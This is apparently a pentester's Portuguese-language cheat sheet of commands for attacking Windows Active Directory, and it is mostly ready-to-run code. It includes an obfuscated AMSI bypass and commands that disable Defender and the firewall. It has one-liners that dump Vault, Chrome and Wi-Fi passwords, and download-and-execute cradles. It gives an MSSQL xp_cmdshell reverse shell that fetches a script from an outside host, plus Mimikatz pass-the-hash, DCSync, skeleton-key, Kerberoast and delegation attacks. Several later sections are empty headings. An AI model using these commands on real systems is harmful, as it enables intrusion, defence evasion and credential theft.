# Active Directory

Tudo relacionado à Active Directory centralizarei neste post para facilitar a procura e exploração, não vou explicar os comandos de maneira completa, tendo em vista isso ser apenas um memorando dos principais comandos que utilizo durante meus pentests!

Nota-se que todos os comandos aqui são dados a partir de máquinas windows para windows (isso mesmo), ou seja, não acrescentei aqui (ainda) os comandos do [Impacket](https://github.com/SecureAuthCorp/impacket)

`Faça bom proveito!`

## Sumário

- [Active Directory](#active-directory)
    - [Sumário](#sumário)
    - [Ferramentas Úteis](#ferramentas-úteis)
        - [Mimikatz.ps1](#mimikatz.ps1)
        - [Kekeo](#kekeo)
        - [HFS](#HFS)
        - [PowerCat](#powercat)
        - [Nishang](#nishang)
        - [PowerView](#powerview.ps1)
        - [PowerView_dev](#powerview_dev.ps1)
        - [AD Module](#ad-module.ps1)
        - [Jenkins](#jenkins)
        - [BloodHound](#bloodhound.ps1)
        - [HeidiSQL](#heidisql-download)
        - [PowerUpSQL.ps1](#powerupsql.ps1)
    - [Miscellaneous](#miscellaneous)
        - [Defense Bypass](#defense-bypass)
            - [AMSI Bypass](#amsi-bypass)
            - [Windows Defender](#windows-defender)
            - [Costrained Language Mode](#constrained-language-mode)
            - [Firewall](#firewall)
            - [Applocker](#applocker)
        - [PSSEssion](#pssesion)
            - [Nova Seção](#nova-seção)
            - [Carregando Scripts](#carregando-scripts)
            - [Executando Comandos](#executando-comandos)
            - [Copiando Arquivos Entre Seções](#copiando-arquivos-entre-seções)
        - [Senhas Vault e Registro](#registro)
            - [Senhas do Windows Vault](#senhas-do-windows-vault)
            - [Senhas do Google Chrome](#senhas-do-google-chrome)
            - [Senhas Wifi](#senhas-wifi)
            - [Patterns no Registro](#patterns-no-registro)
            - [Chaves no Registro](#chaves-no-registro)
            - [Valores no Registro](#valores-no-registro)
        - [Download de Arquivos](#download-de-arquivos)
        - [Extraindo Arquivos Zip](#extraindo-arquivos-zip)
        - [Unattended Files](#unattended-files)
        - [PortScan Powershell](#portscan-powershell)
    - [Reconhecimento](#reconhecimento)
        - [PowerView](#powerview)
            - [Usuários](#usuários)
            - [Grupos](#grupos)
            - [Computadores](#comptuadores)
            - [Domain Administrators](#domain-administrators)
            - [Shares](#shares)
            - [ACL](#acl)
            - [OUs](#ous)
            - [GPO](#gpo)
            - [Trusts](#trusts)
            - [User Hunting](#user-hunting)
            - [SID](#sid)
        - [PowerView_dev.ps1](#powerview_dev)
        - [AD Module.ps1](#ad_module.ps1)
        - [BloodHound](#bloodhound)
    - [MSSQL](#mssql)
        - [PoweUpSQL](#powerupsql)
        - [HeidiSQL](#heidisql)
    - [Mimikatz](#mimikatz)
        - [Recon](#recon)
            - [Dumps](#dumps)
            - [Hashes](#hashes)
        - [Ataques](#ataques)
            - [Pass-The-Hash](#pass-the-hash)
            - [Pass-The-Ticket](#pass-the-ticket)
            - [Privilege Across Trusts](#privilege-across-trusts)
            - [DCSync](#dcsync)
            - [Skeleton Key](#skeleton-key)
            - [Kerberoast](#kerberoast)
            - [Constrained Delegation](#constrained-delegation)
            - [Unconstrained Delegation](#unconstrained-delegation)
        - [Tickets](#tickets)
            - [Golden Ticket](#golden-ticket)
            - [Silver Ticket](#silver-ticket)
                - [RPCSS](#rpcss)
                - [HOST](#host)

# Active Directory

Então, mãos à obra!

## Sumário

Vamos seguir o seguinte sumário já mostrado ali em cima...

### Ferramentas Úteis

Vamos começar pelas ferramentas que utilizei durante a exploração!

### Mimikatz.ps1

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

### Kekeo

[Kekeo](https://github.com/gentilkiwi/kekeo)

### HFS

[HFS](https://www.rejetto.com/hfs/)

### PowerCat

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

### Nishang

[Nishag](https://github.com/samratashok/nishang)

### PowerView.ps1

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### PowerView_dev.ps1

[PowerView_dev](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView-Dev.ps1)

### AD Module.ps1

[ADModule](https://github.com/samratashok/ADModule)

### Jenkins

[Jenkins Brute](https://github.com/chryzsh/JenkinsPasswordSpray)

### BloodHound.ps1

[BloodHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

### HeidiSQL Download

[HeidiSQL](https://www.heidisql.com/download.php)

### PowerUpSQL.ps1

[PowerUPSQL](https://github.com/NetSPI/PowerUpSQL)

## Miscellaneous

Nesta seção está tudo que é tipo de código!

### Defense Bypass

Bypasses simples mas eficazes de defesas

#### AMSI Bypass

```powershell
# Execute no terminal que estiver sendo pego pelo AMSI
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
# Chame um powershell a partir desse local
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
# Execution Policy (não é bem AMSI)
powershell -ep bypass
# Downgrade de versão
powershell -version 2
# Upgrande de versão
pwsh
```

#### Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
Set-MpPreference -DisableIOAVProtection $true
sc stop WinDefend
```

#### Costrained Language Mode

```
Colocar o Invoke-Mimikatz no final do código, não somente o Invoke-Mimikatz mas qualquer outro comando ou script, que ele vai executar assim que carregar
```

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```

#### Firewall

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

#### Applocker

```powershell
# Verifique o arquvios Applocker.Script dentro dessa pasta, o diretório que estiver nele estará liberado
C:\Windows\system32\AppLocker
```
Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
Get-AppLockerPolicy -Xml -Local
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions
```

## PSSEssion

SSH no Windows?!

### Nova Seção

```powershell
$sess = New-PSSession -ComputerName abc.dominio.local
```

### Carregando Scripts

```powershell
# Desativar o Windows Defender
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
# Carregar o Script
Invoke-Command -FilePath "C:\Invoke-Mimikatz.ps1" -session $sess
```

### Executando Comandos

```powershell
Invoke-Command -ScriptBlock {Get-Process Notepad} -Session $sess
```

### Copiando Arquivos Entre Seções

```powershell
Copy-Item -Path C:\Reports\flag.txt -Destination 'C:\Users\Desktop\' -FromSession $sess
```

### Senhas Vault e Registro

Não é bem AD mas ajuda um bocado durante a exploração

#### Senhas do Windows Vault

Importante lugar pra verificar credenciais salvas, já encontrei muita coisa interessante aqui!

```powershell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
```

#### Senhas do Google Chrome

Essa não preciso nem falar nada

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Senhas Wifi

```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

#### Patterns no Registro

```powershell
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
```

#### Chaves no Registro

```powershell
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
```

#### Valores no Registro

```powershell
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
```
funcorp
### Download de Arquivos

Escolha um e seja feliz!

```powershell
Invoke-WebRequest -Uri $url -OutFile $output
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-BitsTransfer -Source $url -Destination $output
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
IEX(New-Object Net.WebClient).DownloadFile('http://0.0.0.0/arquivo','output')
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.5/power.ps1')
```

### Extraindo Arquivos Zip

```powershell
Expand-Archive -Path $Source -DestinationPath $Destination
```

### Unattended Files

```powershell
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### PortScan Powershell

```powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.0.1",$_)) "Port $_ is open!"} 2>$null
```

## Reconhecimento

Aqui vamos iniciar o reconhecimento do Active Directory que vamos explorar!

### PowerView

Primeiro irei realizar os comandos para enumeração com o PowerView depois com o AD Module

#### Usuários

```powershell
Get-NetUser
Get-NetUser -UserName usuario_burro
```

#### Grupos

```powershell
Get-NetGroup | select Name
```

#### Computadores

```powershell
Get-NetComputer | select Name
```

#### Domain Administrators

```powershell
Get-NetGroupMember "Domain Admins"
Get-NetGroup "Enterprise Admins" -Domain domain.com
```

#### Shares

```powershell
Invoke-ShareFinder
```

#### ACL

```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -Verbose
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "USUARIO"}
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RPDUsers"}
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
Invoke-ACLScanner | Where-Object {$_.IdentityReferenceName –eq 'USUARIO$'}
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Where-Object {$_.ActiveDirectoryRights -eq 'WriteProperty'}
```

#### OUs

```powershell
Get-NetOU | select name
```

#### GPO

```powershell
(Get-NetOU StudentMachines).gplink
Get-NetGPO -ADSpath 'LDAP://cn={B822494A-DD6A-4E96-A2BB-944E397208A1},cn=policies,cn=system,DC=us,DC=funcorp,DC=local'
```

#### Trusts

Isso é muito utilizado para Golden Ticket Across Forests!

```powershell
Get-NetForestDomain -Verbose
Get-NetDomainTrust
Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
Get-NetForestDomain -Forest funcorp.local -Verbose | Get-NetDomainTrust
Get-NetForest
```

#### User Hunting

```powershell
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -Verbose
```

#### SID

```powershell
us.dominio.local - Get-DomainSID
dominio.local - Get-DomainSID -Domain dominio.local
```

### PowerView_dev

O PowerView_dev, pessoalmente, eu só utilizei em uma situação até hoje (sei que há muitas oturas funcionalidades nele, tenho que explorar mais)

A funcionalidade que encontrei para ele foi para identificar `Constrained Delegation` habilitada, o comando é esse:

```powershell
Get-DomainUser -TrustedToAuth
```

### AD Module

Aqui eu faço depois, não costumo usar o AD Module muito.

### BloodHound

Para a instalação dele na Kali, digite os comandos:

```bash
sudo apt-get install neo4j
sudo apt-get install bloodhound

# Apos finalizar a instalação, inicie a aplicação

neo4j console
bloodhound

# Mude a senha do neo4j (a padrão inicial não vai entrar)
#E arraste o *.zip pra dentro do bloodhound
```

Acesse esse blog para mais informações!

[BloodHound Tutorial](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)

Comandos para criação do .zip

```powershell
Import-Module ./SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
```

## MSSQL

Aqui iremos explorar um pouco o banco de dados do Active Directory!

### PoweUpSQL

[PowerUpSQL Tutorial](https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/)

Comandos

```powershell
# Carregando o modulo
Import-Module PowerUpSQL.ps1

# Listar todos os SPN
Get-SQLInstanceDomain -Verbose

# Testando conectividade
Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq "Accessible"}

# Verificando as cadeias de links que elas tem
Get-SQLInstanceDomain | Get-SQLServerLink

# Realizando o crawl dentro dos links
# Agora vamos fazer crawl por todo os links e vemos que temos uma cadeia boa de links por todos os servidores sql

Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Verbose 

# Executando comandos através da chain
# Uma vez que temos acesso a chain, agora podemos executar comandos dentro dela (ou pelo menos tentar)

Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Query "exec master..xp_cmdshell 'whoami'" | ft

# Reverse shell, lembrar de deixar o HFS e o powercat aberto

Get-SQLServerLinkCrawl -Instance sql.server.acessivel.local -Query "exec master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://meu.ip/Invoke-PowerShellTcp.ps1'')'" | ft
```

Esses foram os principais comandos que me lembrei do PowerUPSql!

### HeidiSQL

O HeidiSQL é mais simples, apenas colocar a database que eu tenho acesso através do powerupsql, e deixar o login do próprio windows (lembrando que eu devo ter acesso público, pelo menos, pra entrar nela) 

```powershell
# Testando conectividade
Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq "Accessible"}
```

Com o acesso público nós conseguimos escalar privilégios pra 'sa', mas isso eu deixo pra depois pra explicar melhor as técnicas de se fazer isso!

## Mimikatz

Essa parte é importante, mimikatz é uma das melhores ferramentas para exploração em ambiente AD!

#### Dumps

*Dump do Sam (lsadump::sam)→ Local Administrator Hash*

*LogonPasswords (sekurlsa::logonpasswords) → Domain Administrator Hash (Para acessar outras máquinas dentro do domínio)*

#### Hashes

```powershell
# Pegar hash de usuários

./mimikatz.exe lsadump::lsa /patch

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' 

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "exit"' 

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /patch" "lsadump::sam" "exit"'
```

### Ataques

#### Pass-The-Hash

```powershell
./mimikatz.exe sekurlsa::pth /user:USUÁRIO /domain:DOMINIO /ntlm:HASH_NTLM_EXTRAIDO /run:powershell.exe

Invoke-Mimikatz -Command '"sekurlsa::pth /user:USUÁRIO /domain:DOMINIO /ntlm:HASH_NTLM_EXTRAIDO /run:powershell.exe'
```

#### Pass-The-Ticket

Esse eu utilizo muito no [Unconstrained Delegation](#Unconstrained-Delegation), mas tem outras aplicações também

```powershell
# Primeiro devemos ver quais máquinas tem o Uncosntrained Habilitado
Get-NetComputer -UnConstrained | select Name

# Com essa informação, exportamos o ticket dentro da máquina que apareceu no comando anterior (aqui eu cirei uma seção nela, mas pode ser feito direto tbm)
Invoke-Command -ScriptBlock {Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets /export"'} -Session $sess

# Após termos extraidos todos os tickets, vemos qual é interessante de se reutilizar, aqui tem que esperar algm DA ou algum usuário específico logar na máquina pra ser criado o ticket de seção pra ele, e então injetamos na seção
Invoke-Command -ScriptBlock{Invoke-Mimikatz -Command '"kerberos:: ptt [...]"'} -Session $sess

# Agora acessamos a máquina que não tinhamos acesso antes
Invoke-Command -Scriptblock{ls \\MÁQUINA.QUE.NÃO.TINHA.ACESSO.SEM.O.TICKET.local\C$} -session $sess
```

Depois especifico melhor na aba do [Unconstrained Delegation](#Unconstrained-Delegation) (ou não!)

#### Privilege Across Trusts

Na bucha é um Golden Ticket, mas através do trusts dos domains

```powershell
# Aqui ele vai criar o ticket e ja injetar na seção
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:AB.DOMINIO.local /sid:<SID do AB.DOMINIO.local> /krbtgt:KRBTGT_NTLM /sids:<SID do DOMINIO.local> /ptt"'

# AB.DOMINIO.local - Get-DomainSID
# DOMINIO.local - Get-DomainSID -Domain DOMINIO.local
```

Agora vamos ter acesso ao DOMINIO.local através do AB.DOMINIO.local

#### DCSync

```powershell
# Sempre lembrar do privilege::debug e do token::elevate
Invoke-Mimikatz -Command "privilege::debug" "token::elevate" "lsadump::dcsync /domain:AB.DOMINIO.local /user:Administrator" "exit"
```

Assim pegamos o hash do Administrator, pra depois podermos fazer o pth e conseguir acesso às outras máquinas!

#### Skeleton Key

```powershell
# Só consegui fazer funcionar com o executável dele
./mimkatz.exe
privilege::debug
token::elevate
misc::skeleton
```

A senha de acesso pra todas as máquinas vai ser `administrator:mimikatz`

#### Kerberoast

Mais informações de como esse ataque funciona você encontra no meu blog [Kerberoast](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)

Agora conseguimos senhas em claro de usuários, podemos setar SPN também pra alguns usuários

```powershell
setspn -a MSSQLSvc/AB.DOMINIO.local USUARIO_COM_PRIVILEǴIOS
```

Caso já tenhamos usuários setados como SPN, esses são os comandos pra extrair o hash e depois quebrar

```powershell
# Primeiro passo é verificar quais contas estão com o SPN habilitado
Get-NetUser -SPN

# Agora devemos requisitar um ticket do SPN
Request-SPN Ticket MSSQLSvc/AB.DOMINIO.local

# Extrair o ticket
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Agora na kali extrair o hash dela pra quebrar com o john
kibi2john.py
```

#### Constrained Delegation

Mais informações de como esse ataque funciona você encontra no meu blog [Constrained](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)

Aqui vão somentes os comandos pra facilitar a vida do atacante

```powershell
# Importamos o PowerView_dev
Import-Module PowerView_dev.ps1

# Verificamos por máquinas com o Constrained Delegation habilitado, vai aparecer usuários com essa permissão, caso tenha
Get-DomainUser -TrustedToAuth

# Com o hash do usuário (extraimos com o mimikatz) e o rubeus, requisitamos os tickets necessários, TGT
./kekeo.exe
tgt::ask /user:USER_COM_CONSTRAINED /domain:AB.DOMINIO.local /ntlm:HASH_NTLM_DO_USER_COM_CONSTRAINED /ticket:QUALQUER_COISA.kirbi

# Agora solicitamos o TGS
./kekeo.exe
tgs::s4u /tgt:QUALQUER_COISA.kirbi /user:Administrator@AB.DOMINIO.local /service:time/MAQUINA.AB.DOMINIO.local|cifs/MAQUINA.AB.DOMINIO.local

# Agora com o mimikatz injetamos o ticket na seção
Invoke-Mimikatz -Command '"kerberos::ptt tickets_gerados.kirbi"'
```

E teremos acesso à máquina com o Constrained Delegation habilitado

#### Unconstrained Delegation

Mais informações de como esse ataque funciona você encontra no meu blog [Unconstrained](https://0x4rt3mis.github.io/activedirectory/2020/12/20/Active-Directory-Kerberos/)


### Tickets

#### Golden Ticket

#### Silver Ticket

##### RPCSS

##### HOST


## Referencias

Bloodhound

https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/

PowerUpSQL

https://blog.netspi.com/powerupsql-powershell-toolkit-attacking-sql-server/